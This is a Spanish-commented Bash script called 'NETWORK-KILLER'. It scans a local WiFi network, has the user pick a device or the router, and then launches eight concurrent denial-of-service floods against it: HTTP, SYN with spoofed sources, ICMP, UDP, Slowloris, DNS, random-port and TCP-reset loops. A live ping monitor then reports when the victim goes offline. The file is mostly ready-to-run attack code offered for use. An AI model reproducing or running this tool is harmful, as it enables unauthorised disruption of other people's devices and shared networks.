#!/bin/bash
# =============================================================================
# NETWORK-KILLER - Tumba cualquier IP de tu red WiFi
# =============================================================================

# Colores
ROJO='\033[0;31m'
VERDE='\033[0;32m'
AMARILLO='\033[1;33m'
AZUL='\033[0;34m'
MORADO='\033[0;35m'
CIAN='\033[0;36m'
BLANCO='\033[1;37m'
NC='\033[0m'

# Variables
RED="192.168.1.0/24"
ROUTER="192.168.1.1"
INTERFAZ="wlan0"
TU_IP=""

# =============================================================================
# OBTENER PROPIA IP
# =============================================================================
obtener_mi_ip() {
    TU_IP=$(ip -4 addr show $INTERFAZ 2>/dev/null | grep -oE 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | cut -d' ' -f2)
    if [ -z "$TU_IP" ]; then
        TU_IP=$(ifconfig $INTERFAZ 2>/dev/null | grep -oE 'inet [0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | cut -d' ' -f2)
    fi
    if [ -z "$TU_IP" ]; then
        TU_IP="192.168.1.56"
    fi
}

# =============================================================================
# ESCANEAR RED Y MOSTRAR MENÚ
# =============================================================================
escanear_red() {
    echo -e "${AZUL}[*] Escaneando red local...${NC}"
    echo ""
    
    # Escanear con nmap
    IPS=$(nmap -sn $RED 2>/dev/null | grep -oE '192\.168\.1\.[0-9]+')
    
    # Crear arrays
    IPS_ARRAY=()
    ESTADOS_ARRAY=()
    
    # ROUTER primero
    IPS_ARRAY+=("$ROUTER")
    ESTADOS_ARRAY+=("ROUTER")
    
    # Luego las demás
    for ip in $IPS; do
        if [ "$ip" != "$ROUTER" ] && [ "$ip" != "$TU_IP" ]; then
            IPS_ARRAY+=("$ip")
            # Verificar si responde a ping
            if ping -c 1 -W 1 $ip > /dev/null 2>&1; then
                ESTADOS_ARRAY+=("ACTIVO")
            else
                ESTADOS_ARRAY+=("INACTIVO")
            fi
        fi
    done
    
    # Tu IP al final
    IPS_ARRAY+=("$TU_IP")
    ESTADOS_ARRAY+=("TÚ")
    
    # Mostrar menú
    clear
    echo -e "${ROJO}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${ROJO}║              🔥 NETWORK KILLER - ELIGE TU OBJETIVO 🔥          ║${NC}"
    echo -e "${ROJO}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${BLANCO}📱 DISPOSITIVOS CONECTADOS A LA RED:${NC}"
    echo -e "${AZUL}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    for i in "${!IPS_ARRAY[@]}"; do
        num=$((i+1))
        ip="${IPS_ARRAY[$i]}"
        estado="${ESTADOS_ARRAY[$i]}"
        
        case $estado in
            "ROUTER")
                echo -e "   ${AMARILLO}[$num] $ip      🔵 ROUTER${NC}"
                ;;
            "TÚ")
                echo -e "   ${VERDE}[$num] $ip      🟢 TÚ (NO TE ATACARÁS)${NC}"
                ;;
            "ACTIVO")
                echo -e "   ${VERDE}[$num] $ip      🟢 ACTIVO${NC}"
                ;;
            *)
                echo -e "   ${ROJO}[$num] $ip      🔴 INACTIVO${NC}"
                ;;
        esac
    done
    
    echo ""
    echo -e "${AZUL}════════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# =============================================================================
# SELECCIONAR OBJETIVO
# =============================================================================
seleccionar_objetivo() {
    echo -ne "${AMARILLO}Selecciona el número de la IP a tumbar: ${NC}"
    read seleccion
    
    # Validar selección
    if ! [[ "$seleccion" =~ ^[0-9]+$ ]]; then
        echo -e "${ROJO}❌ Selección inválida${NC}"
        return 1
    fi
    
    index=$((seleccion-1))
    if [ $index -lt 0 ] || [ $index -ge ${#IPS_ARRAY[@]} ]; then
        echo -e "${ROJO}❌ Número fuera de rango${NC}"
        return 1
    fi
    
    VICTIMA="${IPS_ARRAY[$index]}"
    ESTADO="${ESTADOS_ARRAY[$index]}"
    
    if [ "$ESTADO" = "TÚ" ]; then
        echo -e "${ROJO}❌ No puedes atacarte a ti mismo${NC}"
        return 1
    fi
    
    if [ "$ESTADO" = "ROUTER" ]; then
        echo -e "${AMARILLO}⚠️ Vas a atacar el router. Toda la red caerá.${NC}"
        echo -ne "${AMARILLO}¿Continuar? (s/n): ${NC}"
        read confirm
        if [ "$confirm" != "s" ] && [ "$confirm" != "S" ]; then
            return 1
        fi
    fi
    
    echo -e "${VERDE}✅ Objetivo seleccionado: $VICTIMA${NC}"
    return 0
}

# =============================================================================
# ATAQUE SIN ROOT (8 ataques)
# =============================================================================
atacar() {
    clear
    echo -e "${ROJO}╔════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${ROJO}║              🔥 ATACANDO $VICTIMA 🔥${NC}"
    echo -e "${ROJO}╚════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    # Verificar root
    if command -v tsu &> /dev/null && [ "$(whoami)" = "root" ]; then
        MODO="ROOT"
        echo -e "${VERDE}✅ Modo ROOT detectado - Ataque máximo${NC}"
    else
        MODO="NO-ROOT"
        echo -e "${AMARILLO}⚠️ Modo NO-ROOT - 8 ataques${NC}"
    fi
    echo ""
    
    # Ataque 1: HTTP Flood
    echo -e "${MORADO}[1/8] HTTP Flood - Saturación web...${NC}"
    python3 -c "
import socket, threading, time
victim='$VICTIMA'
def flood(): 
    while True:
        try:
            s=socket.socket()
            s.connect((victim,80))
            s.send(b'GET / HTTP/1.1\r\nHost: '+victim.encode()+b'\r\n\r\n')
            s.close()
        except: pass
for _ in range(50): threading.Thread(target=flood, daemon=True).start()
" > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ HTTP flood activado${NC}"
    sleep 1
    
    # Ataque 2: SYN Flood
    echo -e "${MORADO}[2/8] SYN Flood - Saturación de puertos...${NC}"
    if command -v hping3 &> /dev/null; then
        for port in 80 443 8080; do
            hping3 -S --flood -p $port --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
        done
    else
        python3 -c "
import socket, threading, random, time
victim='$VICTIMA'
def syn(): 
    while True:
        try:
            s=socket.socket()
            s.connect((victim,80))
            s.close()
        except: pass
for _ in range(30): threading.Thread(target=syn, daemon=True).start()
" > /dev/null 2>&1 &
    fi
    echo -e "${VERDE}   ✅ SYN flood activado${NC}"
    sleep 1
    
    # Ataque 3: ICMP Flood
    echo -e "${MORADO}[3/8] ICMP Flood - Ping de la muerte...${NC}"
    ping -f $VICTIMA > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ ICMP flood activado${NC}"
    sleep 1
    
    # Ataque 4: UDP Flood
    echo -e "${MORADO}[4/8] UDP Flood - Saturación UDP...${NC}"
    if command -v hping3 &> /dev/null; then
        hping3 -2 --flood --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    else
        python3 -c "
import socket, threading, random
victim='$VICTIMA'
def udp(): 
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(b'X'*1024,(victim,random.randint(1,65535)))
        except: pass
for _ in range(30): threading.Thread(target=udp, daemon=True).start()
" > /dev/null 2>&1 &
    fi
    echo -e "${VERDE}   ✅ UDP flood activado${NC}"
    sleep 1
    
    # Ataque 5: Slowloris
    echo -e "${MORADO}[5/8] Slowloris - Conexiones lentas...${NC}"
    python3 -c "
import socket, threading, time
victim='$VICTIMA'
def slowloris():
    try:
        s=socket.socket()
        s.connect((victim,80))
        s.send(b'GET / HTTP/1.1\r\nHost: '+victim.encode()+b'\r\n')
        while True:
            s.send(b'X-a: b\r\n')
            time.sleep(10)
    except: pass
for _ in range(100): threading.Thread(target=slowloris, daemon=True).start()
" > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ Slowloris activado${NC}"
    sleep 1
    
    # Ataque 6: DNS Flood
    echo -e "${MORADO}[6/8] DNS Flood - Saturación DNS...${NC}"
    if command -v hping3 &> /dev/null; then
        hping3 -2 --flood -p 53 --rand-source $VICTIMA -I $INTERFAZ > /dev/null 2>&1 &
    else
        python3 -c "
import socket, threading
victim='$VICTIMA'
def dns():
    while True:
        try:
            s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
            s.sendto(b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03www\x06google\x03com\x00\x00\x01\x00\x01',(victim,53))
        except: pass
for _ in range(20): threading.Thread(target=dns, daemon=True).start()
" > /dev/null 2>&1 &
    fi
    echo -e "${VERDE}   ✅ DNS flood activado${NC}"
    sleep 1
    
    # Ataque 7: Puerto random
    echo -e "${MORADO}[7/8] Puerto random - Caos total...${NC}"
    python3 -c "
import socket, threading, random
victim='$VICTIMA'
def random_port():
    while True:
        try:
            s=socket.socket()
            s.connect((victim,random.randint(1,65535)))
            s.close()
        except: pass
for _ in range(30): threading.Thread(target=random_port, daemon=True).start()
" > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ Puerto random activado${NC}"
    sleep 1
    
    # Ataque 8: TCP Reset
    echo -e "${MORADO}[8/8] TCP Reset - Cerrando conexiones...${NC}"
    python3 -c "
import socket, threading
victim='$VICTIMA'
def reset():
    while True:
        try:
            s=socket.socket()
            s.connect((victim,80))
            s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\\x01\\x00\\x00\\x00')
            s.close()
        except: pass
for _ in range(20): threading.Thread(target=reset, daemon=True).start()
" > /dev/null 2>&1 &
    echo -e "${VERDE}   ✅ TCP reset activado${NC}"
    
    echo ""
    echo -e "${VERDE}✅ 8 ATAQUES LANZADOS CONTRA $VICTIMA${NC}"
    echo ""
}

# =============================================================================
# MONITOREO EN VIVO
# =============================================================================
monitorear() {
    echo -e "${AZUL}════════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLANCO}📊 MONITOREO EN VIVO - $VICTIMA${NC}"
    echo -e "${AZUL}════════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    CONTADOR=0
    while true; do
        CONTADOR=$((CONTADOR+1))
        PING=$(ping -c 1 -W 1 $VICTIMA 2>&1 | grep -oE 'time=[0-9.]+' | cut -d= -f2)
        
        if [ -z "$PING" ]; then
            echo -e "$(date +%H:%M:%S) | ${ROJO}💀 SIN RESPUESTA - DESCONECTADO${NC}"
        elif (( $(echo "$PING > 1000" | bc -l 2>/dev/null) )); then
            echo -e "$(date +%H:%M:%S) | ${ROJO}🔴 $PING ms (MUY LENTO)${NC}"
        elif (( $(echo "$PING > 200" | bc -l 2>/dev/null) )); then
            echo -e "$(date +%H:%M:%S) | ${AMARILLO}🟡 $PING ms (LENTO)${NC}"
        else
            echo -e "$(date +%H:%M:%S) | ${VERDE}🟢 $PING ms (NORMAL)${NC}"
        fi
        
        sleep 2
    done
}

# =============================================================================
# LIMPIEZA
# =============================================================================
limpiar() {
    echo -e "\n${ROJO}[!] Deteniendo ataques...${NC}"
    killall hping3 ping python3 2>/dev/null
    pkill -f "python3.*socket"
    echo -e "${VERDE}✅ Ataque detenido${NC}"
    exit 0
}

# =============================================================================
# MAIN
# =============================================================================
main() {
    trap limpiar INT TERM
    
    obtener_mi_ip
    
    while true; do
        escanear_red
        seleccionar_objetivo
        if [ $? -eq 0 ]; then
            break
        fi
        echo ""
        echo -ne "${AMARILLO}Presiona Enter para reintentar...${NC}"
        read
    done
    
    echo ""
    echo -ne "${AMARILLO}¿Iniciar ataque contra $VICTIMA? (s/n): ${NC}"
    read confirm
    if [ "$confirm" != "s" ] && [ "$confirm" != "S" ]; then
        echo -e "${ROJO}Ataque cancelado${NC}"
        exit 0
    fi
    
    atacar
    monitorear
}

main
